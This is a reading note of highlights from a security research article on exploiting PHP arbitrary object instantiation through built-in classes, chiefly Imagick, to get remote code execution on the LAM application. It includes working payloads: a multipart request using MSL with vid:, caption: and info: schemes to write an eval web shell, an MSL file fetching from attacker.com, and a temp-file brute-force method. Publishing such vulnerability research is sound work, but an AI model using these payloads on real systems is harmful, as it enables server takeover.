---
author: Arseniy Sharoglazov
aliases:
  - Exploiting Arbitrary Object Instantiations in PHP Without Custom Classes
tags:
  - readwise/articles
url: https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/?__readwiseLocation=
date: 2025-05-12
summary: Arseniy Sharoglazov discovered a vulnerability in the PHP application LAM that allows attackers to create arbitrary objects without custom classes. By exploiting this flaw with the Imagick class, he was able to upload a web shell to the server using a specially crafted request. This method demonstrates how vulnerabilities can be exploited even when no direct classes are available in the application.
---
# Exploiting Arbitrary Object Instantiations in PHP Without Custom Classes

![rw-book-cover](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/9cos2hl4zty31-3.png)


PHP’s [Arbitrary Object Instantiation](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Arbitrary%20Object%20Instantiation.md) is a flaw in which an attacker can create arbitrary objects. [](https://read.readwise.io/read/01jv24vfbnvqbrc68fjdym44qn)

In my case, the vulnerable code could have been shortened to one simple construction: [](https://read.readwise.io/read/01jv24w3qh1xpyedmq8r70smq2)
```php
new $_GET['a']($_GET['b']); 
```

There was nothing else there, and I had zero custom classes to give me a code execution or a file upload. [](https://read.readwise.io/read/01jv24wj5wc2srdrxvd746vyef)

*/lam/lib/account.inc*
```php
public static function getModule($name, $scope) {
...
self::$cache[$name . ':' . $scope] = new $name($scope);
...
```

Here, the value of `$_GET['module']` gets to `$name`, and the value of `$_GET['scope']` gets to `$scope`. After this, the construction `new $name($scope)` is executed. [](https://read.readwise.io/read/01jv252g1gj12c3k1291bsc7jt)

## Exploiting `new $a($b)` via Custom Classes or Autoloading

In the construction `new $a($b)`, the variable `$a` stands for **the class name that the object will be created for**, and the variable `$b` stands for the **first argument** that will be passed to the object’s constructor. [](https://read.readwise.io/read/01jv253dhtc9yt0dxae6c6a10m)

If `$a` and `$b` come from GET/POST, they can be strings or string arrays. If they come from JSON or elsewhere, they might have other types, such as object or boolean. [](https://read.readwise.io/read/01jv253zszek85ere9pp4g86qs)

```php
class App {
    function __construct ($cmd) {
        system($cmd);
    }
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
    function App2 ($cmd) {
        system($cmd);
    }
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```

In this code, you can set  `$a`  to  `App`  or  `App2`  and  `$b`  to  `uname -a`. After this, the command  `uname -a`  will be executed. [](https://read.readwise.io/read/01jv255m09xy1es4tvchv9gy2x)

When there are no such exploitable classes in your application, or you have the class needed in a separate file that isn’t included by the vulnerable code, you may take a look at **autoloading** functions. [](https://read.readwise.io/read/01jv25682kp3r2efdqy4renp2b)

Autoloading functions are set by registering callbacks via `spl_autoload_register` or by defining `__autoload`. They are called when an instance of an *unknown* class is trying to be created. [](https://read.readwise.io/read/01jv256jve6abrvfktxytdq09q)

## Exploiting `new $a($b)` via Built-In Classes

When you don’t have custom classes and autoloading, you can rely on built-in PHP classes only. [](https://read.readwise.io/read/01jv257pq0z62k4x8ypnp6et0g)

All of built-in classes can be listed via the `get_declared_classes` function, together with the custom classes:
```php
var_dump(get_declared_classes());
```

Classes with useful constructors can be found via [the reflection API](https://www.php.net/manual/en/book.reflection.php). [](https://read.readwise.io/read/01jv258qpytmz5b82zz7xmvqa4)

```php
<?php

$class_names = get_declared_classes();

foreach ($class_names as $class_name) {
    $rc = new ReflectionClass($class_name);
    $constructor = $rc->getConstructor();

    if ($constructor != NULL) {
        $params = $constructor->getParameters();
        
        echo "new $class_name(";
        
        foreach ($params as $param) {
            $name = $param->getName();
            $opt = $param->isOptional();
            
            if ($opt) {
                echo "[$name], ";
            } else {
                echo "$name, ";
            }
        }
        
        if (empty($params)) {
            echo "[none or dynamic]";
        }
        echo ")\n";
    }
}
```

If you control multiple constructor parameters and can call arbitrary methods afterwards, there are many ways to get a Remote Code Execution. But if you can pass only one parameter and don’t have any calls to the created object, there is almost nothing. [](https://read.readwise.io/read/01jv259wh6btq32p5sxw57pd75)

Essentially, there are only three ways to get something from `new $a($b)`. [](https://read.readwise.io/read/01jv25aftphhdbh8hf4wk657wp)

### SSRF + PHAR

**Exploiting [Server Side Request Forgery (SSRF)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Server%20Side%20Request%20Forgery%20(SSRF).md) + [PHAR deserialization](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Insecure%20Deserialization%20&%20Object%20Injection.md#PHAR%20deserialization)**

The `SplFileObject` class implements a constructor that allows connection to any local or remote URL:
```php
new SplFileObject('http://attacker.com/');
```

This allows SSRF. Additionally, SSRFs in PHP < 8.0 could be turned into deserializations via techniques with the Phar protocol. [](https://read.readwise.io/read/01jv25b52yza28nvj0dqftaj00)

### PDO

**Exploiting PDOs**

The PDO class has another interesting constructor:
```php
new PDO("sqlite:/tmp/test.txt")
```

The `PDO` constructor accepts DSN strings, allowing us to connect to any local or remote database using installed database extensions. [](https://read.readwise.io/read/01jv25c68wx62f5tq2n520z934)

### XXE with SoapClient/SimpleXMLElement

**SoapClient/SimpleXMLElement [XML External Entity Injection (XXE Injection)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/XML%20External%20Entity%20Injection%20(XXE%20Injection).md)**

In PHP ≤ 5.3.22 and ≤ 5.4.12, the constructor of SoapClient was vulnerable to XXE. The constructor of SimpleXMLElement was vulnerable to XXE as well, but it required libxml2 < 2.9. [](https://read.readwise.io/read/01jv25cm216pgcekzcsat6mp0v)

## The Imagick Extension

Since LAM is distributed via deb/rpm packages, it contains a configuration file with all its requirements and dependents [](https://read.readwise.io/read/01jv25e4ef854kkqjb1eb1pnnx). Among them, LAM 5.5 requires PHP ≥ 5.4.26, and LDAP, GD, JSON, and #Imagick extensions. [](https://read.readwise.io/read/01jv25eag90jrj71d40f3f2v42)

The Imagick extension implements multiple classes, including the class Imagick. Its *constructor has only one parameter*, which can be a string or a string array [](https://read.readwise.io/read/01jv25fycteak50r90tjwbq4jz).

I tested whether  `Imagick::__construct`  accepts remote schemes and can connect to my host via HTTP:
![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/4.png) [](https://read.readwise.io/read/01jv25g5bk3qdk9zjxzmatsqk9)

I discovered that the Imagick class exists on the target server, and executing  `new Imagick(...)` is enough to coerce the server to connect to my host. [](https://read.readwise.io/read/01jv25ger05bs9xkbjev9859vv)

If I could pass values such as `epsi:/local/path` or `msl:/local/path` to ImageMagick, it would use their scheme part, e.g., epsi or msl, to determine the file format. [](https://read.readwise.io/read/01jv25hfhj5vd3zjnfm8tp2yqm)

### Exploring the MSL Format

The most interesting ImageMagick format is MSL. [](https://read.readwise.io/read/01jv25hthjbgfhbht2n3vpzyez) MSL stands for *Magick Scripting Language*. [](https://read.readwise.io/read/01jv25j3hjfwa5xqw2xx4j1kw6)

I tested whether `new Imagick(...)` allows `msl:` scheme:

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/6.png)
*Including an msl file via new Imagick(…)*

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/7.png)
*Starting an HTTP server to serve files to be copied via MSL* [](https://read.readwise.io/read/01jv25mzx032cczt7rt5m3e2fd)

Unfortunately, URLs like `msl:http://attacker.com/` aren’t supported, and I needed to upload files to the server to make `msl:` work. [](https://read.readwise.io/read/01jv25n8ebkwzfe0257n3nv1px)

### Imagick’s Path Parsing 

Imagick supports [](https://read.readwise.io/read/01jv25rh4b0h1vmhhrrm439yjn) also PHP schemes (such as “php://”, “zlib://”, etc). [](https://read.readwise.io/read/01jv25ryt414x1kqcgtww0t08n)

Here is what I discovered.

**A null-byte still works**

An Imagick argument is truncated by a null-byte, even when it contains a PHP scheme:
```php
# No errors
$a = new Imagick("/tmp/positive.png\x00.jpg");
# No errors
$a = new Imagick("http://attacker.com/test\x00test");
```

**Square brackets can be used to detect ImageMagick**

ImageMagick is capable of reading options, e.g., an image’s size or frame numbers, from square brackets from the end of the file path: [](https://read.readwise.io/read/01jv25t6pbvm95k750b0753h2x)
```php
# No errors
$a = new Imagick("/tmp/positive.png[10x10]");
# No errors
$a = new Imagick("/tmp/positive.png[10x10]\x00.jpg"); 
```

**“https://” goes to PHP, but “https:/” goes to curl**

ImageMagick supports more than 100 different schemes. Half of ImageMagick’s schemes are mapped to external programs. This mapping can be viewed using the `convert -list delegate` command. [](https://read.readwise.io/read/01jv25v3ft129w4hz97bwb8ye0)

Passing the `https:/` string to `new Imagick(...)` bypasses PHP’s HTTPS client and invokes a curl process. [](https://read.readwise.io/read/01jv25w4fn58kn2yg8d4w8exnn)

**PHP’s arrays can be used to enumerate files**

When I discovered the curl technique with flushing the request data to `/tmp/*.dat`, and brute forcing `/proc/[pid]/fd/[fd]`, I tested whether `new Imagick('http://...')` flushes data as well. It does! [](https://read.readwise.io/read/01jv25x2azmh6wk5hp0a13wgy5)

## RCE #1: PHP Crash + Brute Force

`text:fd:30` and similar constructions case a worker process to crash on the remote web server [](https://read.readwise.io/read/01jv25ysa6b5f7abd8253fdgce).

This is what made it initially possible to upload a web shell!

The idea was to create multiple PHP temporary files with our content using `multipart/form-data` requests. According to the default `max_file_uploads` value, any client can send up to 20 files in a multipart request, which will be saved to `/tmp/phpXXXXXX` paths, where `X ∈ [A-Za-z0-9]`. These files will never be deleted if we cause the worker that creates them to crash. [](https://read.readwise.io/read/01jv25zwxjq52fefrz4zp13cxh)

If we send 20,000 such multipart requests containing 20 files each, it will result in the creation of 400,000 temporary files. [](https://read.readwise.io/read/01jv260yjry9kh519dvc5yvgmm)

So, in a 63.21% chance, after 142,000 tries we will be able to guess at least one temporary name and include our file with the MSL content. [](https://read.readwise.io/read/01jv2612pmzxy1yceakk5rve9g)

1. We need to create an image [](https://read.readwise.io/read/01jv2629x6w327qg96b6xmwfc1)
```bash
convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' positive.png
```

2. Let’s create an MSL file that will copy this image from our HTTP server to a writable web directory. [](https://read.readwise.io/read/01jv262h4k0998nvzpf6kn38h7)

```xml
<?xml version="1.0" encoding="UTF-8"?> <image> <read filename="http://attacker.com/positive.png" /> <write filename="/var/lib/ldap-account-manager/tmp/positive.php" /> </image> 
```

3. Let’s put it all together in Burp Suite Intruder:
![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/13.png) [](https://read.readwise.io/read/01jv26415h2pqn94nxv9tk9v12)

Additionally, I enabled the *denial-of-service mode* in Burp Intruder to prevent descriptor exhaustion of Burp Suite, which might happen because of incorrect TCP handling on the server side. [](https://read.readwise.io/read/01jv264h5b6damw4mrzhqerzty)

After all 20,000 multipart requests were sent, I brute forced the `/tmp/phpXXXXXX` files via Burp Intruder [](https://read.readwise.io/read/01jv264r8p3nh9kpypp7c2q3sb)

## RCE #2: VID Scheme

By using the `vid:` scheme, we can include our temporary file with the MSL content without knowing its name:

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/18.png)
*Including an MSL file without knowing its name*

After this, I discovered quite interesting `caption:` and `info:` schemes. The combination of both allows to eliminate an out-of-band connection, and create a web shell in one fell swoop:
![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/19.png)
*Uploading a web shell via caption: and info: schemes*


Here is the final payload for exploiting Arbitrary Object Instantiations: [](https://read.readwise.io/read/01jv268zk7jt3gpxq9r52dwwvh)
```http
Class Name: Imagick
Argument Value: vid:msl:/tmp/php*

-- Request Data --
Content-Type: multipart/form-data; boundary=ABC
Content-Length: ...
Connection: close
--ABC
Content-Disposition: form-data; name="swarm"; filename="swarm.msl"
Content-Type: text/plain
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php @eval(@$_REQUEST['a']); ?&gt;" />
<!-- Relative paths such as info:./../../uploads/swarm.php can be used as well -->
<write filename="info:/var/www/swarm.php" />
</image>
--ABC-- 
```


